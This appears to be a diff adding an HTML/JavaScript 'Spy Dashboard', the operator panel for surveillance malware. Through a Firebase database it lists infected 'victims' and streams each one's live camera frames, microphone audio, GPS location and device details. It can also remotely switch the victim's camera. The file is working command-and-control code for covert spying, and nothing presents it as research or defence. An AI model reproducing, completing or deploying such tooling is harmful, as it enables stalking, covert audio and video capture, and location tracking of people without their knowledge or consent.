@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XRYS Spy Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        /* Custom Scrollbar for Sidebar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 10px; }
+    </style>
+</head>
+<body class="bg-[#0f172a] text-white h-screen flex overflow-hidden font-sans">
+
+    <!-- Sidebar: Victim List -->
+    <div class="w-1/3 bg-gray-900 border-r border-gray-700 h-full flex flex-col">
+        <div class="p-4 bg-gray-800 border-b border-gray-700 flex justify-between items-center shadow-lg z-10">
+            <div>
+                <h1 class="text-xl font-bold text-red-500">🕵️ Targets</h1>
+                <p class="text-xs text-gray-400 mt-1" id="onlineCount">0 Devices</p>
+            </div>
+            <div class="w-3 h-3 bg-red-500 rounded-full animate-ping"></div>
+        </div>
+        <div id="victimList" class="flex-1 overflow-y-auto divide-y divide-gray-800">
+            <!-- Victims will load here -->
+        </div>
+    </div>
+
+    <!-- Main Area: Spying Data -->
+    <div class="flex-1 flex flex-col h-full relative">
+        
+        <!-- Welcome Screen -->
+        <div id="welcomeMsg" class="absolute inset-0 flex items-center justify-center text-gray-500 flex-col">
+            <svg class="w-24 h-24 mb-4 opacity-30" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+            <p class="text-lg">Select a target to spy</p>
+        </div>
+
+        <!-- Spying Data Panel -->
+        <div id="spyPanel" class="hidden flex-1 p-6 flex flex-col gap-6 overflow-y-auto">
+            
+            <div class="flex justify-between items-center border-b border-gray-700 pb-3">
+                <h2 class="text-2xl font-bold text-red-400" id="spyTargetId">Target: #000000</h2>
+                <!-- Delete Button (Main) -->
+                <button onclick="deleteCurrentTarget()" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
+                    Remove Target
+                </button>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-6">
+                <!-- Camera Feed -->
+                <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex flex-col relative shadow-xl">
+                    <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Live Camera Feed</h3>
+                    <div class="flex-1 bg-black rounded-lg overflow-hidden flex items-center justify-center relative min-h-[250px] border border-gray-600">
+                        <img id="spyCam" src="" class="w-full h-full object-cover hidden">
+                        <div id="camWait" class="absolute flex flex-col items-center">
+                            <div class="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-red-500 mb-2"></div>
+                            <p class="text-gray-500 text-xs">Waiting for frame...</p>
+                        </div>
+                    </div>
+                    <!-- Switch Camera Button -->
+                    <button onclick="switchCamera()" class="absolute top-12 right-6 bg-gray-900/80 px-3 py-1 rounded-full text-xs hover:bg-red-600 transition border border-gray-600">
+                        🔄 Switch Cam
+                    </button>
+                </div>
+
+                <!-- Location & Audio -->
+                <div class="flex flex-col gap-6">
+                    <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex-1 shadow-xl">
+                        <h3 class="text-sm font-bold text-gray-400 mb-3 uppercase tracking-wider">Live Location</h3>
+                        <p id="spyLocation" class="text-sm font-mono text-center mb-4 text-green-400 break-all">Unknown</p>
+                        <a id="spyMapsBtn" href="#" target="_blank" class="block bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg font-bold text-center text-sm transition">Open Maps</a>
+                    </div>
+
+                    <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex-1 shadow-xl">
+                        <h3 class="text-sm font-bold text-gray-400 mb-3 uppercase tracking-wider">Microphone</h3>
+                        <div class="flex items-center justify-center h-full">
+                            <audio id="spyAudio" controls class="w-full hidden accent-red-500"></audio>
+                            <p id="audioWait" class="text-xs text-gray-500 animate-pulse">Listening...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Device Info -->
+            <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 shadow-xl">
+                <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase tracking-wider">Device Info</h3>
+                <p id="spyDevice" class="text-xs font-mono text-gray-300 break-all bg-black p-3 rounded border border-gray-700"></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = { databaseURL: "https://download-apks-adc2c-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentSelectedId = null;
+        const victimList = document.getElementById('victimList');
+
+        // Audio Player Logic
+        let audioQueue = [];
+        let isPlayingAudio = false;
+        const spyAudio = document.getElementById('spyAudio');
+
+        // Listen to Firebase for all victims
+        db.ref('victims').on('value', (snapshot) => {
+            const data = snapshot.val();
+            victimList.innerHTML = '';
+            
+            if(!data) {
+                document.getElementById('onlineCount').innerText = "0 Devices";
+                if(currentSelectedId) resetPanel(); // If current was deleted, reset
+                return;
+            }
+
+            const ids = Object.keys(data);
+            document.getElementById('onlineCount').innerText = ids.length + " Devices";
+
+            // If current selected is deleted by another tab/process, reset panel
+            if(currentSelectedId && !data[currentSelectedId]) {
+                resetPanel();
+            }
+
+            ids.forEach(id => {
+                const v = data[id];
+                
+                const div = document.createElement('div');
+                // Highlight if selected
+                const isSelected = currentSelectedId === id;
+                div.className = `p-4 cursor-pointer hover:bg-gray-800 transition border-l-4 ${isSelected ? 'border-red-500 bg-gray-800' : 'border-transparent'} flex justify-between items-center`;
+                
+                // Add click to select
+                div.onclick = (e) => {
+                    // Prevent selecting if clicking the delete button
+                    if(e.target.closest('.delete-btn')) return;
+                    selectVictim(id, v);
+                };
+                
+                div.innerHTML = `
+                    <div class="overflow-hidden pr-2">
+                        <div class="flex items-center gap-2 mb-1">
+                            <h3 class="font-bold text-lg text-white">ID: ${id}</h3>
+                            <span class="text-[10px] px-2 py-0.5 rounded-full ${v.camStatus === 'Active' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">${v.camStatus || 'Unknown'}</span>
+                        </div>
+                        <p class="text-xs text-gray-400 truncate">${v.location || 'No Location'}</p>
+                    </div>
+                    <!-- Sidebar Delete Button -->
+                    <button class="delete-btn text-gray-500 hover:text-red-500 p-2 transition" onclick="deleteTarget('${id}', event)">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
+                    </button>
+                `;
+                victimList.appendChild(div);
+            });
+        });
+
+        function selectVictim(id, data) {
+            currentSelectedId = id;
+            
+            // Show Panel
+            document.getElementById('welcomeMsg').classList.add('hidden');
+            document.getElementById('spyPanel').classList.remove('hidden');
+            
+            // Set Data
+            document.getElementById('spyTargetId').innerText = "Target: #" + id;
+            document.getElementById('spyDevice').innerText = data.device || "Unknown Device";
+            
+            // Location
+            document.getElementById('spyLocation').innerText = data.location || "Not available";
+            if(data.mapsLink) {
+                document.getElementById('spyMapsBtn').href = data.mapsLink;
+                document.getElementById('spyMapsBtn').classList.remove('hidden');
+            } else {
+                document.getElementById('spyMapsBtn').classList.add('hidden');
+            }
+
+            // Reset UI Data
+            document.getElementById('spyCam').classList.add('hidden');
+            document.getElementById('camWait').classList.remove('hidden');
+            document.getElementById('spyAudio').classList.add('hidden');
+            document.getElementById('audioWait').classList.remove('hidden');
+            audioQueue = [];
+
+            // Subscribe to live updates for this specific victim
+            db.ref('victims/' + id).on('value', (snap) => {
+                const v = snap.val();
+                if(!v) return; // User might have been deleted
+                
+                // Update Camera Feed
+                if(v.latest_frame) {
+                    document.getElementById('spyCam').src = v.latest_frame;
+                    document.getElementById('spyCam').classList.remove('hidden');
+                    document.getElementById('camWait').classList.add('hidden');
+                }
+
+                // Update Location if it changed
+                if(v.location && v.location !== "Waiting...") {
+                    document.getElementById('spyLocation').innerText = v.location;
+                    if(v.mapsLink) document.getElementById('spyMapsBtn').href = v.mapsLink;
+                }
+
+                // Audio Feed
+                if(v.latest_audio) {
+                    document.getElementById('spyAudio').classList.remove('hidden');
+                    document.getElementById('audioWait').classList.add('hidden');
+                    
+                    // Only play if it's a new chunk
+                    if(audioQueue[audioQueue.length - 1] !== v.latest_audio && !isPlayingAudio) {
+                        audioQueue.push(v.latest_audio);
+                        playNextAudio();
+                    }
+                }
+            });
+        }
+
+        // --- DELETE FUNCTIONALITY ---
+        function deleteTarget(id, event) {
+            if(event) event.stopPropagation(); // Stop clicking from triggering select
+            
+            if(confirm(`Are you sure you want to completely remove Target #${id}?`)) {
+                db.ref('victims/' + id).remove().then(() => {
+                    if(currentSelectedId === id) {
+                        resetPanel();
+                    }
+                });
+            }
+        }
+
+        function deleteCurrentTarget() {
+            if(currentSelectedId) {
+                deleteTarget(currentSelectedId, null);
+            }
+        }
+
+        function resetPanel() {
+            currentSelectedId = null;
+            document.getElementById('spyPanel').classList.add('hidden');
+            document.getElementById('welcomeMsg').classList.remove('hidden');
+            
+            // Stop Audio
+            spyAudio.pause();
+            spyAudio.src = "";
+            audioQueue = [];
+            isPlayingAudio = false;
+        }
+
+        // --- CAMERA SWITCH ---
+        function switchCamera() {
+            if(currentSelectedId) {
+                db.ref('victims/' + currentSelectedId + '/command').set('switch');
+                // Small visual feedback
+                const btn = event.target;
+                const originalText = btn.innerText;
+                btn.innerText = "Switching...";
+                setTimeout(() => btn.innerText = originalText, 2000);
+            }
+        }
+
+        // --- AUDIO PLAYBACK QUEUE ---
+        function playNextAudio() {
+            if (audioQueue.length === 0) { 
+                isPlayingAudio = false; 
+                return; 
+            }
+            isPlayingAudio = true;
+            spyAudio.src = audioQueue.shift();
+            spyAudio.play().catch(e => {
+                // Auto-play might be blocked by browser until user interacts
+                isPlayingAudio = false;
+            });
+        }
+        
+        spyAudio.onended = () => {
+            isPlayingAudio = false;
+            playNextAudio();
+        };
+    </script>
+</body>
+  </html>
